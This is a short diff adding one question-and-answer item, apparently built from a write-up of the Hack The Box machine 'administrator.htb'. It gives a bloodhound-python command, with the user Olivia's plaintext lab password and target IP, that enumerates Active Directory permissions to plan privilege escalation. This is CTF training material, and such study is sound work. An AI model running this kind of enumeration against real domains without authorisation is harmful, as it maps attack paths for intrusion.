@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What steps should you take after obtaining access as Olivia?
+
+CONTEXT:
+You plan to escalate privileges using Bloodhound.
+
+METHOD / ANSWER:
+Command: `bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns 10.10.11.42 --zip`
+Explanation: This command collects Bloodhound data to analyze user permissions and potential attack paths.
